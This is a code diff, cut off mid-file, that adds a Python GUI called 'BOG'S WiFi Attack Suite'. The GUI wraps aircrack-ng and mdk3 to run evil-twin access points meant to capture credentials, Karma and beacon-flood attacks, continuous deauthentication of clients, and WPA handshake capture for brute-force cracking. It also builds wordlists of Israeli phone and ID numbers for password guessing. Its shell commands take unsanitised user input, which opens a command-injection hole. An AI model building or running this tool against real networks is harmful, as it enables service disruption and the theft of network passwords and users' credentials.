@@ -1,0 +1,1559 @@
+#!/usr/bin/env python3
+import os
+import subprocess
+import tkinter as tk
+from tkinter import ttk, messagebox, filedialog
+import re
+import tempfile
+import psutil
+import logging
+import sys
+import signal
+import shutil
+from datetime import datetime
+import json
+from pathlib import Path
+import platform
+import time
+
+# ------------------ Configuration ------------------
+CONFIG_DIR = os.path.expanduser("~/.bog_wifi_suite")
+CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
+LOG_FILE = os.path.join(CONFIG_DIR, "bog_wifi_suite.log")
+
+# ------------------ GUI Constants ------------------
+COLORS = {
+    'bg_dark': "#1E1E1E",
+    'bg_light': "#2D2D2D",
+    'text': "#FFFFFF",
+    'success': "#28A745",
+    'danger': "#DC3545",
+    'info': "#17A2B8",
+    'warning': "#FFC107",
+    'primary': "#007BFF"
+}
+
+STYLES = {
+    'frame': {
+        'bg': COLORS['bg_light'],
+        'relief': 'groove',
+        'padx': 10,
+        'pady': 10
+    },
+    'label': {
+        'bg': COLORS['bg_light'],
+        'fg': COLORS['text'],
+        'font': ('Arial', 10)
+    },
+    'entry': {
+        'bg': COLORS['bg_dark'],
+        'fg': COLORS['text'],
+        'insertbackground': COLORS['text']
+    },
+    'button': {
+        'font': ('Arial', 10, 'bold'),
+        'relief': 'raised',
+        'cursor': 'hand2'
+    }
+}
+
+ICONS = {
+    'start': "▶",
+    'stop': "⬛",
+    'scan': "🔍",
+    'capture': "📥",
+    'attack': "⚡",
+    'monitor': "📡",
+    'wordlist': "📝",
+    'settings': "⚙",
+    'warning': "⚠",
+    'success': "✅",
+    'error': "❌"
+}
+
+TOOLTIPS = {
+    'monitor_mode': "Enable monitor mode on selected interface",
+    'wifi_scan': "Scan for nearby WiFi networks",
+    'evil_twin': "Create a fake access point to capture credentials",
+    'karma': "Respond to all probe requests automatically",
+    'beacon': "Flood area with fake access points",
+    'deauth': "Send deauthentication packets to disconnect clients",
+    'brute_force': "Try to crack WPA/WPA2 passwords",
+    'capture': "Capture WPA handshake for cracking",
+    'stop': "Stop all running attacks",
+    'interface': "Select your wireless network interface",
+    'channel': "Select WiFi channel (1-14)",
+    'bssid': "MAC address of target network",
+    'essid': "Name of target network"
+}
+
+def create_styled_frame(parent):
+    """Create a styled frame with consistent look."""
+    frame = tk.Frame(parent, **STYLES['frame'])
+    return frame
+
+def create_styled_label(parent, text, **kwargs):
+    """Create a styled label with consistent look and additional properties."""
+    label = tk.Label(
+        parent,
+        text=text,
+        bg=COLORS['bg_light'],
+        fg=COLORS['text'],
+        font=('Arial', 10),
+        **kwargs
+    )
+    return label
+
+def create_styled_entry(parent, textvariable=None, tooltip=None):
+    """Create a styled entry with tooltip."""
+    entry = tk.Entry(
+        parent,
+        textvariable=textvariable,
+        **STYLES['entry']
+    )
+    if tooltip:
+        create_tooltip(entry, tooltip)
+    return entry
+
+def create_styled_button(parent, text, command, color, icon=None, tooltip=None):
+    """Create a styled button with icon and tooltip."""
+    btn_text = f"{icon} {text}" if icon else text
+    btn = tk.Button(
+        parent,
+        text=btn_text,
+        command=command,
+        bg=color,
+        fg=COLORS['text'],
+        **STYLES['button']
+    )
+    if tooltip:
+        create_tooltip(btn, tooltip)
+    return btn
+
+def create_tooltip(widget, text):
+    """Create a tooltip for a widget."""
+    def enter(event):
+        tooltip = tk.Toplevel()
+        tooltip.wm_overrideredirect(True)
+        tooltip.wm_geometry(f"+{event.x_root+10}+{event.y_root+10}")
+        
+        label = tk.Label(
+            tooltip, 
+            text=text, 
+            bg=COLORS['bg_dark'],
+            fg=COLORS['text'],
+            relief='solid',
+            borderwidth=1,
+            padx=5,
+            pady=2
+        )
+        label.pack()
+        
+        widget.tooltip = tooltip
+
+    def leave(event):
+        if hasattr(widget, 'tooltip'):
+            widget.tooltip.destroy()
+            delattr(widget, 'tooltip')
+
+    widget.bind('<Enter>', enter)
+    widget.bind('<Leave>', leave)
+
+# ------------------ Logging Setup ------------------
+def setup_logging():
+    os.makedirs(CONFIG_DIR, exist_ok=True)
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s - %(levelname)s - %(message)s',
+        handlers=[
+            logging.FileHandler(LOG_FILE),
+            logging.StreamHandler(sys.stdout)
+        ]
+    )
+    return logging.getLogger(__name__)
+
+logger = setup_logging()
+
+# ------------------ Global Variables ------------------
+running_processes = []
+brute_force_process = None
+custom_wordlist_path = None
+BUILT_IN_WORDLIST = "/usr/share/wordlists/rockyou.txt"
+ISRAELI_PHONE_WORDLIST = os.path.join(CONFIG_DIR, "israeli_phones.txt")
+ISRAELI_ID_WORDLIST = os.path.join(CONFIG_DIR, "israeli_ids.txt")
+
+def generate_israeli_phone_wordlist():
+    """Generate wordlist of Israeli phone numbers."""
+    os.makedirs(CONFIG_DIR, exist_ok=True)
+    with open(ISRAELI_PHONE_WORDLIST, 'w') as f:
+        for prefix in range(50, 60):  # 050-059
+            for number in range(10000000, 100000000):  # 8 digits
+                f.write(f"0{prefix}{number}\n")
+
+def generate_israeli_id_wordlist():
+    """Generate wordlist of Israeli ID numbers."""
+    os.makedirs(CONFIG_DIR, exist_ok=True)
+    with open(ISRAELI_ID_WORDLIST, 'w') as f:
+        for number in range(100000000, 1000000000):  # 9 digits
+            f.write(f"{number}\n")
+
+# ------------------ System Checks ------------------
+def check_system():
+    """Perform system compatibility checks."""
+    # Check if running on Linux
+    if platform.system() != "Linux":
+        messagebox.showerror("System Error", "This tool only works on Linux systems")
+        sys.exit(1)
+
+    # Check for required tools
+    required_tools = ["iw", "iwconfig", "airmon-ng", "airodump-ng", "aircrack-ng", "mdk3"]
+    missing_tools = []
+    
+    for tool in required_tools:
+        try:
+            subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        except subprocess.CalledProcessError:
+            missing_tools.append(tool)
+    
+    if missing_tools:
+        messagebox.showerror(
+            "Missing Tools",
+            f"The following required tools are missing:\n{', '.join(missing_tools)}\n\n"
+            "Please install them using:\n"
+            "sudo apt-get install aircrack-ng mdk3"
+        )
+        sys.exit(1)
+
+    # Check for wireless interfaces
+    interfaces = get_network_interfaces()
+    if not interfaces or interfaces[0] == "No interfaces found":
+        messagebox.showerror("Hardware Error", "No wireless interfaces found")
+        sys.exit(1)
+
+    # Check for monitor mode support
+    for interface in interfaces:
+        try:
+            result = subprocess.run(["iw", "list"], capture_output=True, text=True, check=True)
+            if "monitor" in result.stdout.lower():
+                return True
+        except subprocess.CalledProcessError:
+            continue
+    
+    messagebox.showerror(
+        "Hardware Error",
+        "No wireless interfaces support monitor mode.\n"
+        "Please ensure you have a compatible wireless card."
+    )
+    sys.exit(1)
+
+# ------------------ Terminal Management ------------------
+def get_terminal_emulator():
+    """Get available terminal emulator."""
+    if platform.system() == "Windows":
+        return "cmd.exe"
+    
+    terminals = ["gnome-terminal", "konsole", "xterm", "xfce4-terminal", "terminator"]
+    for terminal in terminals:
+        try:
+            subprocess.run(["which", terminal], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            return terminal
+        except subprocess.CalledProcessError:
+            continue
+    return None
+
+def open_terminal(command):
+    """Open a new terminal with the given command."""
+    if platform.system() == "Windows":
+        try:
+            process = subprocess.Popen(
+                ["cmd.exe", "/c", "start", "cmd.exe", "/k", command],
+                creationflags=subprocess.CREATE_NEW_CONSOLE
+            )
+            return process
+        except Exception as e:
+            logger.error(f"Error opening Windows terminal: {e}")
+            messagebox.showerror("Error", f"Failed to open Windows terminal: {e}")
+            return None
+    
+    terminal = get_terminal_emulator()
+    if not terminal:
+        messagebox.showerror("Error", "No terminal emulator found")
+        return None
+
+    try:
+        if terminal == "gnome-terminal":
+            cmd = f"gnome-terminal -- bash -c '{command}; exec bash'"
+        elif terminal == "konsole":
+            cmd = f"konsole -e bash -c '{command}; exec bash'"
+        elif terminal == "xterm":
+            cmd = f"xterm -e bash -c '{command}; exec bash'"
+        elif terminal == "xfce4-terminal":
+            cmd = f"xfce4-terminal -e 'bash -c \"{command}; exec bash\"'"
+        elif terminal == "terminator":
+            cmd = f"terminator -e 'bash -c \"{command}; exec bash\"'"
+        
+        process = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
+        return process
+    except Exception as e:
+        logger.error(f"Error opening terminal: {e}")
+        return None
+
+# ------------------ Process Management ------------------
+class ProcessManager:
+    def __init__(self):
+        self.processes = []
+        self.temp_files = []
+
+    def add_process(self, process):
+        if process:
+            self.processes.append(process)
+            logger.info(f"Added process {process.pid}")
+
+    def add_temp_file(self, file_path):
+        self.temp_files.append(file_path)
+        logger.info(f"Added temp file {file_path}")
+
+    def stop_all(self):
+        """Stop all running processes and clean up temp files."""
+        logger.info("Stopping all processes...")
+        
+        # Stop processes
+        for proc in self.processes:
+            try:
+                if proc.poll() is None:
+                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                    logger.info(f"Terminated process {proc.pid}")
+            except Exception as e:
+                logger.error(f"Error terminating process: {e}")
+
+        # Kill known tools
+        tools = ["airodump-ng", "airbase-ng", "aireplay-ng", "mdk3", "aircrack-ng"]
+        for tool in tools:
+            try:
+                subprocess.run(["pkill", "-f", tool], check=False)
+                logger.info(f"Killed all {tool} processes")
+            except Exception as e:
+                logger.error(f"Error killing {tool} processes: {e}")
+
+        # Clean up temp files
+        for file_path in self.temp_files:
+            try:
+                if os.path.exists(file_path):
+                    os.remove(file_path)
+                    logger.info(f"Removed temp file {file_path}")
+            except Exception as e:
+                logger.error(f"Error removing temp file {file_path}: {e}")
+
+        self.processes = []
+        self.temp_files = []
+
+# ------------------ Helper Functions ------------------
+def sanitize_input(input_str):
+    """Sanitize user input to prevent command injection."""
+    return re.sub(r'[;&|`$]', '', input_str)
+
+def check_root():
+    """Check if the script is running with root privileges."""
+    if os.geteuid() != 0:
+        logger.error("This script requires root privileges")
+        messagebox.showerror("Permission Error", "This script must be run with root privileges (sudo)")
+        sys.exit(1)
+
+def load_config():
+    """Load configuration from file."""
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, 'r') as f:
+                return json.load(f)
+        except Exception as e:
+            logger.error(f"Error loading config: {e}")
+    return {}
+
+def save_config(config):
+    """Save configuration to file."""
+    try:
+        with open(CONFIG_FILE, 'w') as f:
+            json.dump(config, f, indent=4)
+    except Exception as e:
+        logger.error(f"Error saving config: {e}")
+
+def get_network_interfaces():
+    """Get list of available network interfaces."""
+    interfaces = []
+    try:
+        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=True)
+        lines = result.stdout.split("\n")
+        for line in lines:
+            if "Interface" in line:
+                iface = line.split()[1]
+                interfaces.append(iface)
+    except subprocess.CalledProcessError as e:
+        logger.error(f"Error detecting interfaces: {e}")
+        messagebox.showerror("Error", "Failed to detect network interfaces")
+    return interfaces if interfaces else ["No interfaces found"]
+
+def is_monitor_mode(interface):
+    """Check if interface is in monitor mode."""
+    try:
+        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True, check=True)
+        return "Mode:Monitor" in result.stdout
+    except subprocess.CalledProcessError:
+        return False
+
+def run_command(cmd, success_msg):
+    """Run a command safely with proper error handling."""
+    try:
+        # Sanitize command
+        cmd = sanitize_input(cmd)
+        
+        # Create a new process group
+        process = subprocess.Popen(
+            cmd,
+            shell=True,
+            preexec_fn=os.setsid,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        
+        logger.info(success_msg)
+        return process
+    except Exception as e:
+        error_msg = f"Error executing command: {e}"
+        logger.error(error_msg)
+        messagebox.showerror("Command Error", error_msg)
+        return None
+
+def stop_all_attacks():
+    """Stop all running attacks and clean up resources."""
+    global running_processes
+    logger.info("Stopping all running attacks...")
+
+    for proc in running_processes:
+        try:
+            if proc.poll() is None:
+                # Kill the entire process group
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                logger.info(f"Terminated process {proc.pid}")
+        except Exception as e:
+            logger.error(f"Error terminating process: {e}")
+
+    # Kill known tools by name
+    tools = ["airodump-ng", "airbase-ng", "aireplay-ng", "mdk3", "aircrack-ng"]
+    for tool in tools:
+        try:
+            subprocess.run(["pkill", "-f", tool], check=False)
+            logger.info(f"Killed all {tool} processes")
+        except Exception as e:
+            logger.error(f"Error killing {tool} processes: {e}")
+
+    running_processes = []
+    logger.info("All attacks stopped")
+
+def cleanup_temp_files():
+    """Clean up temporary files."""
+    try:
+        temp_files = Path("/tmp").glob("bog_*")
+        for file in temp_files:
+            try:
+                file.unlink()
+            except Exception as e:
+                logger.error(f"Error deleting temp file {file}: {e}")
+    except Exception as e:
+        logger.error(f"Error during temp file cleanup: {e}")
+
+# ------------------ Main Application ------------------
+class BogWifiSuite:
+    def __init__(self, root):
+        self.root = root
+        self.process_manager = ProcessManager()
+        self.current_capture_process = None
+        self.current_capture_file = None
+        self.handshake_captured = False
+        self.setup_ui()
+        self.load_saved_config()
+        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
+
+    def setup_ui(self):
+        """Setup the main UI components."""
+        self.root.title("BOG'S WiFi Attack Suite - Version 9")
+        self.root.geometry("900x700")
+        self.root.configure(bg=COLORS['bg_dark'])
+
+        # Add padding around the main window
+        main_frame = create_styled_frame(self.root)
+        main_frame.pack(fill="both", expand=True, padx=20, pady=20)
+
+        # Setup notebook with custom style
+        style = ttk.Style()
+        style.configure("Custom.TNotebook", background=COLORS['bg_dark'])
+        style.configure("Custom.TNotebook.Tab", background=COLORS['bg_light'], 
+                       foreground=COLORS['text'], padding=[10, 5])
+        
+        self.notebook = ttk.Notebook(main_frame, style="Custom.TNotebook")
+        self.notebook.pack(fill="both", expand=True, padx=10, pady=10)
+
+        # Create all tabs with improved styling
+        self.tabs = {
+            "Monitor Mode": self.create_monitor_tab(),
+            "WiFi Scanner": self.create_scanner_tab(),
+            "Evil Twin": self.create_evil_twin_tab(),
+            "Karma Attack": self.create_karma_tab(),
+            "Beacon Flooding": self.create_beacon_tab(),
+            "Auto Deauth": self.create_deauth_tab(),
+            "WPA Brute Force": self.create_brute_force_tab()
+        }
+
+        for name, frame in self.tabs.items():
+            self.notebook.add(frame, text=name)
+
+        # Setup log panel with improved styling
+        self.setup_log_panel()
+
+        # Setup footer with improved styling
+        self.setup_footer()
+
+    def load_saved_config(self):
+        """Load saved configuration."""
+        config = load_config()
+        if config:
+            # Apply saved configuration
+            pass  # Add configuration loading logic here
+            
+    def on_closing(self):
+        """Handle application closing."""
+        if messagebox.askokcancel("Quit", "Do you want to quit?"):
+            self.process_manager.stop_all()
+            cleanup_temp_files()
+            self.root.destroy()
+
+    def create_monitor_tab(self):
+        """Create the Monitor Mode tab."""
+        frame = create_styled_frame(self.notebook)
+        
+        # Interface selection
+        interface_frame = create_styled_frame(frame)
+        interface_frame.pack(fill="x", padx=20, pady=10)
+        
+        create_styled_label(interface_frame, "Select Interface:").pack(side="left")
+        self.interface_var = tk.StringVar()
+        interfaces = get_network_interfaces()
+        interface_menu = ttk.Combobox(interface_frame, textvariable=self.interface_var, values=interfaces, style="Custom.TCombobox")
+        interface_menu.pack(side="left", padx=5)
+        
+        # Monitor mode button
+        monitor_btn = create_styled_button(
+            frame, "Enable Monitor Mode",
+            self.enable_monitor_mode,
+            COLORS['primary'],
+            ICONS['monitor'],
+            TOOLTIPS['monitor_mode']
+        )
+        monitor_btn.pack(pady=10)
+        
+        # Status label
+        self.monitor_status = create_styled_label(frame, "")
+        self.monitor_status.pack(pady=5)
+        
+        return frame
+
+    def enable_monitor_mode(self):
+        """Enable monitor mode on selected interface."""
+        interface = self.interface_var.get()
+        if not interface:
+            messagebox.showwarning("Error", "Please select an interface")
+            return
+
+        if is_monitor_mode(interface):
+            self.monitor_status.config(text=f"{interface} is already in monitor mode")
+            return
+
+        try:
+            # Kill interfering processes
+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
+            
+            # Start monitor mode
+            result = subprocess.run(
+                ["sudo", "airmon-ng", "start", interface],
+                capture_output=True, text=True, check=True
+            )
+            
+            # Get monitor interface name
+            monitor_interface = interface + "mon"
+            match = re.search(r"\(monitor mode enabled on ([^\)]+)\)", result.stdout)
+            if match:
+                monitor_interface = match.group(1)
+            
+            self.monitor_status.config(text=f"Monitor mode enabled on {monitor_interface}")
+            logger.info(f"Monitor mode enabled on {monitor_interface}")
+            
+            # Update interface list
+            interfaces = get_network_interfaces()
+            self.interface_var.set(monitor_interface)
+            
+        except subprocess.CalledProcessError as e:
+            error_msg = f"Failed to enable monitor mode: {e}"
+            self.monitor_status.config(text=error_msg)
+            messagebox.showerror("Error", error_msg)
+            logger.error(error_msg)
+
+    def create_scanner_tab(self):
+        """Create the WiFi Scanner tab."""
+        frame = create_styled_frame(self.notebook)
+        
+        # Interface selection
+        interface_frame = create_styled_frame(frame)
+        interface_frame.pack(fill="x", padx=20, pady=10)
+        
+        create_styled_label(interface_frame, "Select Interface:").pack(side="left")
+        self.scanner_interface_var = tk.StringVar()
+        interfaces = get_network_interfaces()
+        interface_menu = ttk.Combobox(interface_frame, textvariable=self.scanner_interface_var, values=interfaces, style="Custom.TCombobox")
+        interface_menu.pack(side="left", padx=5)
+
+        # Channel selection
+        channel_frame = create_styled_frame(frame)
+        channel_frame.pack(fill="x", padx=20, pady=5)
+        
+        create_styled_label(channel_frame, "Channel:").pack(side="left")
+        self.scanner_channel_var = tk.StringVar(value="all")
+        channel_menu = ttk.Combobox(channel_frame, textvariable=self.scanner_channel_var, 
+                                  values=["all"] + [str(i) for i in range(1, 15)], style="Custom.TCombobox")
+        channel_menu.pack(side="left", padx=5)
+
+        # Scan button
+        scan_btn = create_styled_button(
+            frame, "Start WiFi Scan",
+            self.start_wifi_scan,
+            COLORS['primary'],
+            ICONS['scan'],
+            TOOLTIPS['wifi_scan']
+        )
+        scan_btn.pack(pady=10)
+
+        return frame
+
+    def start_wifi_scan(self):
+        """Start WiFi scanning process."""
+        interface = self.scanner_interface_var.get()
+        if not interface:
+            messagebox.showwarning("Error", "Please select an interface")
+            return
+
+        channel = self.scanner_channel_var.get()
+        if not is_monitor_mode(interface):
+            messagebox.showwarning("Error", "Interface must be in monitor mode")
+            return
+
+        try:
+            # Create capture file
+            capture_file = tempfile.mktemp(prefix="bog_scan_", suffix=".cap")
+            self.process_manager.add_temp_file(capture_file)
+
+            # Build airodump command
+            cmd = f"sudo airodump-ng"
+            if channel != "all":
+                cmd += f" -c {channel}"
+            cmd += f" -w {capture_file} {interface}"
+
+            # Start scan in new terminal
+            process = open_terminal(cmd)
+            if process:
+                self.process_manager.add_process(process)
+                logger.info(f"Started WiFi scan on {interface}")
+        except Exception as e:
+            error_msg = f"Failed to start WiFi scan: {e}"
+            messagebox.showerror("Error", error_msg)
+            logger.error(error_msg)
+
+    def create_evil_twin_tab(self):
+        """Create the Evil Twin tab."""
+        frame = create_styled_frame(self.notebook)
+
+        # Target network info
+        target_frame = create_styled_frame(frame)
+        target_frame.pack(fill="x", padx=20, pady=10)
+
+        # BSSID
+        create_styled_label(target_frame, "Target BSSID:").pack(anchor="w")
+        self.evil_bssid_var = tk.StringVar()
+        create_styled_entry(target_frame, textvariable=self.evil_bssid_var, tooltip=TOOLTIPS['bssid']).pack(fill="x", pady=5)
+
+        # ESSID
+        create_styled_label(target_frame, "Target ESSID:").pack(anchor="w")
+        self.evil_essid_var = tk.StringVar()
+        create_styled_entry(target_frame, textvariable=self.evil_essid_var, tooltip=TOOLTIPS['essid']).pack(fill="x", pady=5)
+
+        # Channel
+        channel_frame = create_styled_frame(frame)
+        channel_frame.pack(fill="x", padx=20, pady=5)
+        
+        create_styled_label(channel_frame, "Channel:").pack(side="left")
+        self.evil_channel_var = tk.StringVar(value="6")
+        channel_menu = ttk.Combobox(channel_frame, textvariable=self.evil_channel_var, 
+                                  values=[str(i) for i in range(1, 15)], style="Custom.TCombobox")
+        channel_menu.pack(side="left", padx=5)
+
+        # Interface selection
+        interface_frame = create_styled_frame(frame)
+        interface_frame.pack(fill="x", padx=20, pady=10)
+        
+        create_styled_label(interface_frame, "Select Interface:").pack(side="left")
+        self.evil_interface_var = tk.StringVar()
+        interfaces = get_network_interfaces()
+        interface_menu = ttk.Combobox(interface_frame, textvariable=self.evil_interface_var, values=interfaces, style="Custom.TCombobox")
+        interface_menu.pack(side="left", padx=5)
+
+        # Start button
+        start_btn = create_styled_button(
+            frame, "Start Evil Twin",
+            self.start_evil_twin,
+            COLORS['primary'],
+            ICONS['attack'],
+            TOOLTIPS['evil_twin']
+        )
+        start_btn.pack(pady=10)
+
+        return frame
+
+    def start_evil_twin(self):
+        """Start Evil Twin attack."""
+        interface = self.evil_interface_var.get()
+        bssid = self.evil_bssid_var.get()
+        essid = self.evil_essid_var.get()
+        channel = self.evil_channel_var.get()
+
+        if not all([interface, bssid, essid, channel]):
+            messagebox.showwarning("Error", "Please fill in all fields")
+            return
+
+        if not is_monitor_mode(interface):
+            messagebox.showwarning("Error", "Interface must be in monitor mode")
+            return
+
+        try:
+            # Start airbase-ng with more aggressive settings
+            cmd = f"sudo airbase-ng -a {bssid} --essid \"{essid}\" -c {channel} -W 1 -Z 4 {interface}"
+            process = open_terminal(cmd)
+            if process:
+                self.process_manager.add_process(process)
+                logger.info(f"Started Evil Twin attack on {interface}")
+
+                # Configure interface
+                time.sleep(2)  # Wait for at0 to be created
+                subprocess.run(["sudo", "ifconfig", "at0", "up"], check=False)
+                subprocess.run(["sudo", "ifconfig", "at0", "192.168.1.1", "netmask", "255.255.255.0"], check=False)
+
+        except Exception as e:
+            error_msg = f"Failed to start Evil Twin attack: {e}"
+            messagebox.showerror("Error", error_msg)
+            logger.error(error_msg)
+
+    def create_karma_tab(self):
+        """Create the Karma Attack tab."""
+        frame = create_styled_frame(self.notebook)
+
+        # Interface selection
+        interface_frame = create_styled_frame(frame)
+        interface_frame.pack(fill="x", padx=20, pady=10)
+        
+        create_styled_label(interface_frame, "Select Interface:").pack(side="left")
+        self.karma_interface_var = tk.StringVar()
+        interfaces = get_network_interfaces()
+        interface_menu = ttk.Combobox(interface_frame, textvariable=self.karma_interface_var, values=interfaces, style="Custom.TCombobox")
+        interface_menu.pack(side="left", padx=5)
+
+        # Start button
+        start_btn = create_styled_button(
+            frame, "Start Karma Attack",
+            self.start_karma,
+            COLORS['primary'],
+            ICONS['attack'],
+            TOOLTIPS['karma']
+        )
+        start_btn.pack(pady=10)
+
+        return frame
+
+    def start_karma(self):
+        """Start Karma attack."""
+        interface = self.karma_interface_var.get()
+        if not interface:
+            messagebox.showwarning("Error", "Please select an interface")
+            return
+
+        if not is_monitor_mode(interface):
+            messagebox.showwarning("Error", "Interface must be in monitor mode")
+            return
+
+        try:
+            cmd = f"sudo airbase-ng -P -C 30 -v {interface}"
+            process = open_terminal(cmd)
+            if process:
+                self.process_manager.add_process(process)
+                logger.info(f"Started Karma attack on {interface}")
+        except Exception as e:
+            error_msg = f"Failed to start Karma attack: {e}"
+            messagebox.showerror("Error", error_msg)
+            logger.error(error_msg)
+
+    def create_beacon_tab(self):
+        """Create the Beacon Flooding tab."""
+        frame = create_styled_frame(self.notebook)
+
+        # ESSID
+        create_styled_label(frame, "ESSID:").pack(anchor="w", padx=20, pady=5)
+        self.beacon_essid_var = tk.StringVar()
+        create_styled_entry(frame, textvariable=self.beacon_essid_var, tooltip=TOOLTIPS['essid']).pack(fill="x", padx=20, pady=5)
+
+        # Channel
+        channel_frame = create_styled_frame(frame)
+        channel_frame.pack(fill="x", padx=20, pady=5)
+        
+        create_styled_label(channel_frame, "Channel:").pack(side="left")
+        self.beacon_channel_var = tk.StringVar(value="6")
+        channel_menu = ttk.Combobox(channel_frame, textvariable=self.beacon_channel_var, 
+                                  values=[str(i) for i in range(1, 15)], style="Custom.TCombobox")
+        channel_menu.pack(side="left", padx=5)
+
+        # Interface selection
+        interface_frame = create_styled_frame(frame)
+        interface_frame.pack(fill="x", padx=20, pady=10)
+        
+        create_styled_label(interface_frame, "Select Interface:").pack(side="left")
+        self.beacon_interface_var = tk.StringVar()
+        interfaces = get_network_interfaces()
+        interface_menu = ttk.Combobox(interface_frame, textvariable=self.beacon_interface_var, values=interfaces, style="Custom.TCombobox")
+        interface_menu.pack(side="left", padx=5)
+
+        # Start button
+        start_btn = create_styled_button(
+            frame, "Start Beacon Flooding",
+            self.start_beacon_flood,
+            COLORS['primary'],
+            ICONS['attack'],
+            TOOLTIPS['beacon']
+        )
+        start_btn.pack(pady=10)
+
+        return frame
+
+    def start_beacon_flood(self):
+        """Start Beacon Flooding attack."""
+        interface = self.beacon_interface_var.get()
+        essid = self.beacon_essid_var.get()
+        channel = self.beacon_channel_var.get()
+
+        if not all([interface, essid, channel]):
+            messagebox.showwarning("Error", "Please fill in all fields")
+            return
+
+        if not is_monitor_mode(interface):
+            messagebox.showwarning("Error", "Interface must be in monitor mode")
+            return
+
+        try:
+            cmd = f"sudo mdk3 {interface} b -n \"{essid}\" -c {channel}"
+            process = open_terminal(cmd)
+            if process:
+                self.process_manager.add_process(process)
+                logger.info(f"Started Beacon Flooding on {interface}")
+        except Exception as e:
+            error_msg = f"Failed to start Beacon Flooding: {e}"
+            messagebox.showerror("Error", error_msg)
+            logger.error(error_msg)
+
+    def create_deauth_tab(self):
+        """Create the Auto Deauth tab."""
+        frame = create_styled_frame(self.notebook)
+
+        # Target BSSID
+        create_styled_label(frame, "Target BSSID:").pack(anchor="w", padx=20, pady=5)
+        self.deauth_bssid_var = tk.StringVar()
+        create_styled_entry(frame, textvariable=self.deauth_bssid_var, tooltip=TOOLTIPS['bssid']).pack(fill="x", padx=20, pady=5)
+
+        # Channel
+        channel_frame = create_styled_frame(frame)
+        channel_frame.pack(fill="x", padx=20, pady=5)
+        
+        create_styled_label(channel_frame, "Channel:").pack(side="left")
+        self.deauth_channel_var = tk.StringVar(value="6")
+        channel_menu = ttk.Combobox(channel_frame, textvariable=self.deauth_channel_var, 
+                                  values=[str(i) for i in range(1, 15)], style="Custom.TCombobox")
+        channel_menu.pack(side="left", padx=5)
+
+        # Interface selection
+        interface_frame = create_styled_frame(frame)
+        interface_frame.pack(fill="x", padx=20, pady=10)
+        
+        create_styled_label(interface_frame, "Select Interface:").pack(side="left")
+        self.deauth_interface_var = tk.StringVar()
+        interfaces = get_network_interfaces()
+        interface_menu = ttk.Combobox(interface_frame, textvariable=self.deauth_interface_var, values=interfaces, style="Custom.TCombobox")
+        interface_menu.pack(side="left", padx=5)
+
+        # Start button
+        start_btn = create_styled_button(
+            frame, "Start Auto Deauth",
+            self.start_auto_deauth,
+            COLORS['primary'],
+            ICONS['attack'],
+            TOOLTIPS['deauth']
+        )
+        start_btn.pack(pady=10)
+
+        return frame
+
+    def start_auto_deauth(self):
+        """Start Auto Deauth attack."""
+        interface = self.deauth_interface_var.get()
+        bssid = self.deauth_bssid_var.get()
+        channel = self.deauth_channel_var.get()
+
+        if not all([interface, bssid, channel]):
+            messagebox.showwarning("Error", "Please fill in all fields")
+            return
+
+        if not is_monitor_mode(interface):
+            messagebox.showwarning("Error", "Interface must be in monitor mode")
+            return
+
+        try:
+            cmd = f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}"
+            process = open_terminal(cmd)
+            if process:
+                self.process_manager.add_process(process)
+                logger.info(f"Started Auto Deauth on {interface}")
+        except Exception as e:
+            error_msg = f"Failed to start Auto Deauth: {e}"
+            messagebox.showerror("Error", error_msg)
+            logger.error(error_msg)
+
+    def create_brute_force_tab(self):
+        """Create the WPA Brute Force tab with improved UI."""
+        frame = create_styled_frame(self.notebook)
+
+        # Target network info
+        target_frame = create_styled_frame(frame)
+        target_frame.pack(fill="x", pady=(0, 10))
+
+        # BSSID
+        create_styled_label(target_frame, "Target BSSID:").pack(anchor="w")
+        self.brute_bssid_var = tk.StringVar()
+        create_styled_entry(
+            target_frame,
+            textvariable=self.brute_bssid_var,
+            tooltip=TOOLTIPS['bssid']
+        ).pack(fill="x", pady=5)
+
+        # ESSID
+        create_styled_label(target_frame, "Target ESSID:").pack(anchor="w")
+        self.brute_essid_var = tk.StringVar()
+        create_styled_entry(
+            target_frame,
+            textvariable=self.brute_essid_var,
+            tooltip=TOOLTIPS['essid']
+        ).pack(fill="x", pady=5)
+
+        # Interface selection
+        interface_frame = create_styled_frame(frame)
+        interface_frame.pack(fill="x", pady=10)
+        
+        create_styled_label(interface_frame, "Select Interface:").pack(side="left")
+        self.brute_interface_var = tk.StringVar()
+        interface_menu = ttk.Combobox(
+            interface_frame,
+            textvariable=self.brute_interface_var,
+            values=get_network_interfaces(),
+            style="Custom.TCombobox"
+        )
+        interface_menu.pack(side="left", padx=5)
+        create_tooltip(interface_menu, TOOLTIPS['interface'])
+
+        # Status frame
+        self.status_frame = create_styled_frame(frame)
+        self.status_frame.pack(fill="x", pady=10)
+        
+        self.capture_status_label = tk.Label(
+            self.status_frame,
+            text="Ready to capture handshake",
+            bg=COLORS['bg_light'],
+            fg=COLORS['text'],
+            font="Arial 10 bold"
+        )
+        self.capture_status_label.pack(pady=5)
+
+        # Progress indicator
+        self.progress_var = tk.StringVar(value="")
+        self.progress_label = tk.Label(
+            self.status_frame,
+            textvariable=self.progress_var,
+            font="Arial 16",
+            bg=COLORS['bg_light'],
+            fg=COLORS['info']
+        )
+        self.progress_label.pack(pady=5)
+
+        # Buttons frame
+        button_frame = create_styled_frame(frame)
+        button_frame.pack(fill="x", pady=10)
+
+        # Capture handshake button
+        self.capture_button = create_styled_button(
+            button_frame,
+            "Capture Handshake",
+            self.capture_handshake,
+            COLORS['info'],
+            ICONS['capture'],
+            TOOLTIPS['capture']
+        )
+        self.capture_button.pack(pady=5)
+
+        # Stop capture button (initially hidden)
+        self.stop_button = create_styled_button(
+            button_frame,
+            "Stop Capture",
+            lambda: self.stop_capture(force=True),
+            COLORS['danger'],
